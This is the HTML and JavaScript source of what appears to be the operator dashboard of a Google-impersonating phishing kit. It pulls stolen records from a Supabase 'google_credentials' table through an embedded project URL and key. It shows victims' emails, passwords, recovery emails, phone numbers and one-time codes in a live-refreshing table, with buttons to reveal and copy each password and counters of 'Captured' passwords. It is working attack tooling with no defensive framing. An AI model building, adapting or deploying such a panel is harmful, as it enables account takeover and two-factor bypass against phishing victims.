<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Google — Dashboard</title>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
<style>
*{box-sizing:border-box;margin:0;padding:0;}
body{font-family:'Inter',-apple-system,sans-serif;background:#f4f4f4;min-height:100vh;}
.navbar{background:#000;padding:0 32px;height:56px;display:flex;align-items:center;justify-content:space-between;position:sticky;top:0;z-index:100;}
.navbar-logo{font-size:20px;color:#fff;font-weight:400;}
.navbar-logo span{font-weight:700;}
.navbar-right{display:flex;align-items:center;gap:16px;}
.live-badge{display:flex;align-items:center;gap:6px;background:rgba(6,193,103,.15);border:1px solid rgba(6,193,103,.3);border-radius:999px;padding:4px 12px;font-size:12px;font-weight:600;color:#06c167;}
.live-dot{width:7px;height:7px;border-radius:50%;background:#06c167;animation:pulse 1.5s infinite;}
@keyframes pulse{0%,100%{opacity:1}50%{opacity:.3}}
.refresh-timer{font-size:12px;color:#9e9e9e;}
.main{padding:32px;max-width:1400px;margin:0 auto;}
.table-card{background:#fff;border-radius:12px;border:1px solid #d9d9d9;overflow:hidden;margin-bottom:24px;}
.table-header{padding:20px 24px;border-bottom:1px solid #eeeeee;display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:12px;}
.table-header h2{font-size:16px;font-weight:700;}
.last-update{font-size:12px;color:#9e9e9e;}
.btn-refresh{display:flex;align-items:center;gap:6px;background:#000;color:#fff;border:none;border-radius:8px;padding:8px 16px;font-size:13px;font-weight:600;cursor:pointer;}
.btn-refresh:hover{background:#1a1a1a;}
.tbl-wrap{overflow-x:auto;}
table{width:100%;border-collapse:collapse;}
thead tr{background:#f6f6f6;}
thead th{padding:12px 20px;text-align:left;font-size:11px;font-weight:700;color:#9e9e9e;text-transform:uppercase;letter-spacing:.06em;border-bottom:1px solid #eeeeee;white-space:nowrap;}
tbody tr{border-bottom:1px solid #eeeeee;animation:rowIn .3s ease both;}
@keyframes rowIn{from{opacity:0;transform:translateY(-4px)}to{opacity:1}}
tbody tr:hover{background:#f6f6f6;}
tbody td{padding:14px 20px;font-size:13px;}
.id-badge{background:#eeeeee;color:#545454;font-size:11px;font-weight:700;padding:3px 8px;border-radius:6px;font-family:monospace;}
.email-text{font-weight:600;color:#000;}
.pw-text{font-family:monospace;font-size:13px;font-weight:600;color:#e11d48;background:#fff1f2;padding:4px 8px;border-radius:4px;cursor:pointer;user-select:all;}
.pw-hidden{font-family:monospace;font-size:13px;color:#9e9e9e;letter-spacing:2px;}
.copy-btn{background:#eeeeee;border:1px solid #d9d9d9;border-radius:4px;font-size:10px;font-weight:600;color:#545454;padding:2px 6px;cursor:pointer;white-space:nowrap;transition:all .15s;}
.copy-btn:hover{background:#000;color:#fff;border-color:#000;}
.copy-btn.ok{background:#d1fae5;color:#065f46;border-color:#a7f3d0;}
.time-text{font-size:12px;color:#9e9e9e;}
.empty-state{padding:60px 20px;text-align:center;color:#9e9e9e;}
.empty-state .icon{font-size:40px;margin-bottom:12px;}
.spinner{width:18px;height:18px;border:2.5px solid #d9d9d9;border-top-color:#000;border-radius:50%;animation:spin .65s linear infinite;vertical-align:middle;margin-right:8px;}
@keyframes spin{to{transform:rotate(360deg)}}
.stats{display:grid;grid-template-columns:repeat(4,1fr);gap:16px;}
.stat-card{background:#fff;border-radius:12px;padding:20px 24px;border:1px solid #d9d9d9;}
.stat-card .label{font-size:12px;color:#9e9e9e;font-weight:600;text-transform:uppercase;letter-spacing:.05em;margin-bottom:8px;}
.stat-card .value{font-size:32px;font-weight:700;}
.stat-card .sub-val{font-size:13px;color:#9e9e9e;margin-top:4px;}
#toast{position:fixed;bottom:22px;left:50%;transform:translateX(-50%) translateY(60px);background:#1a1a1a;color:#fff;font-size:13px;padding:10px 20px;border-radius:8px;transition:transform .25s;z-index:999;}
#toast.show{transform:translateX(-50%) translateY(0);}
@media(max-width:768px){.stats{grid-template-columns:repeat(2,1fr);}.main{padding:16px;}.tbl-wrap{font-size:11px;}}
</style>
</head>
<body>

<nav class="navbar">
  <div class="navbar-logo">Google — Dashboard</div>
  <div class="navbar-right">
    <div class="live-badge"><span class="live-dot"></span>LIVE</div>
    <span class="refresh-timer" id="timer">Refreshing in 3s</span>
  </div>
</nav>

<div class="main">
  <div class="table-card">
    <div class="table-header">
      <h2>Credentials — <span id="row-count" style="color:#9e9e9e;font-weight:500;">0 records</span></h2>
      <div style="display:flex;align-items:center;gap:12px;">
        <span class="last-update" id="last-update">—</span>
        <button class="btn-refresh" onclick="loadData()">↻ Refresh</button>
      </div>
    </div>
    <div class="tbl-wrap">
      <table>
        <thead>
          <tr>
            <th>#</th>
            <th>Email</th>
            <th>Password</th>
            <th>Recovery Email</th>
            <th>Phone</th>
            <th>OTP Code</th>
            <th>Step</th>
            <th>Submitted At</th>
          </tr>
        </thead>
        <tbody id="tbl-body">
          <tr><td colspan="8" style="text-align:center;padding:40px;"><span class="spinner"></span>Loading...</td></tr>
        </tbody>
      </table>
    </div>
  </div>

  <div class="stats">
    <div class="stat-card"><div class="label">Total</div><div class="value" id="stat-total">—</div><div class="sub-val">Submissions</div></div>
    <div class="stat-card"><div class="label">Complete</div><div class="value" id="stat-complete" style="color:#06c167">—</div><div class="sub-val">All steps</div></div>
    <div class="stat-card"><div class="label">Password</div><div class="value" id="stat-pw" style="color:#e11d48">—</div><div class="sub-val">Captured</div></div>
    <div class="stat-card"><div class="label">Latest</div><div class="value" id="stat-latest" style="font-size:15px;">—</div><div class="sub-val">Recent email</div></div>
  </div>
</div>

<div id="toast"></div>

<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
<script>
const SB_URL='https://ikryqjberxoyatgbxosk.supabase.co';
const SB_KEY='sb_publishable_7hcGVnVEcD2N01Uei0O5lQ_FglYs8Gz';
const {createClient}=supabase;
const sb=createClient(SB_URL,SB_KEY);
let shownPws={};

function toast(m){var t=document.getElementById('toast');t.textContent=m;t.classList.add('show');setTimeout(()=>t.classList.remove('show'),2000);}
function copy(txt,btnId){navigator.clipboard.writeText(txt).then(()=>{toast('✓ Copied');if(btnId){var b=document.getElementById(btnId);b.textContent='✓ Copied';b.classList.add('ok');setTimeout(()=>{b.textContent='Copy';b.classList.remove('ok');},1500);}});}

async function loadData(){
  try{
    const {data,error}=await sb.from('google_credentials').select('*').order('id',{ascending:false});
    if(error||!data){document.getElementById('tbl-body').innerHTML='<tr><td colspan="8" style="padding:40px;text-align:center;color:#9e9e9e;">No data</td></tr>';return;}
    
    const total=data.length;
    const complete=data.filter(r=>r.step_reached>=4).length;
    const withPw=data.filter(r=>r.password).length;
    const latest=data.length>0?(data[0].email||'—'):'—';
    
    document.getElementById('stat-total').textContent=total;
    document.getElementById('stat-complete').textContent=complete;
    document.getElementById('stat-pw').textContent=withPw;
    document.getElementById('stat-latest').textContent=latest.length>20?latest.substring(0,18)+'…':latest;
    document.getElementById('row-count').textContent=total+' record'+(total!==1?'s':'');
    document.getElementById('last-update').textContent='Updated '+new Date().toLocaleTimeString();
    
    const stepLabels=['—','Email','Password','Recovery','Phone','Verified'];
    const tbody=document.getElementById('tbl-body');
    
    if(!total){tbody.innerHTML='<tr><td colspan="8"><div class="empty-state"><div class="icon">📭</div><p>No submissions</p></div></td></tr>';return;}
    
    tbody.innerHTML=data.map(r=>{
      const pw=r.password||'';
      const shown=shownPws[r.id];
      const pwCell=pw?`<div style="display:flex;gap:6px;align-items:center;">${shown?`<span class="pw-text" onclick="copy('${pw.replace(/'/g,"\\'")}','cb${r.id}')">${pw}</span>`:`<span class="pw-hidden">••••••••</span>`}<button style="background:0;border:0;cursor:pointer;color:#9e9e9e;font-size:11px;font-weight:600;" onclick="shownPws[${r.id}]=!shownPws[${r.id}];loadData();">${shown?'Hide':'Show'}</button><button class="copy-btn" id="cb${r.id}" onclick="copy('${pw.replace(/'/g,"\\'")}','cb${r.id}')">Copy</button></div>`:'—';
      const recEmail=r.recovery_email||'—';
      const phone=r.phone||'—';
      const otp=r.otp_code||'—';
      const time=r.created_at?new Date(r.created_at).toLocaleString('en-US',{month:'short',day:'numeric',hour:'2-digit',minute:'2-digit'}):'—';
      const stepLabel=stepLabels[r.step_reached]||'—';
      const stepColor=['','#f59e0b','#276ef1','#9333ea','#06b6d4','#06c167'][r.step_reached]||'#gray';
      
      return `<tr>
        <td><span class="id-badge">${r.id}</span></td>
        <td><span class="email-text">${r.email||'—'}</span></td>
        <td>${pwCell}</td>
        <td><span style="font-size:12px;">${recEmail}</span></td>
        <td><span style="font-family:monospace;font-size:12px;">${phone}</span></td>
        <td><span style="font-family:monospace;font-size:12px;font-weight:600;color:${stepColor};">${otp}</span></td>
        <td><span style="background:${stepColor}18;color:${stepColor};font-size:11px;font-weight:700;padding:3px 6px;border-radius:12px;">${stepLabel}</span></td>
        <td><span class="time-text">${time}</span></td>
      </tr>`;
    }).join('');
  }catch(e){console.error(e);toast('Error');}
}

let countdown=3;
function startTimer(){
  countdown=3;
  const t=setInterval(()=>{
    countdown--;
    document.getElementById('timer').textContent=`Refreshing in ${countdown}s`;
    if(countdown<=0){clearInterval(t);loadData();startTimer();}
  },1000);
}

loadData();
startTimer();
</script>
</body>
</html>
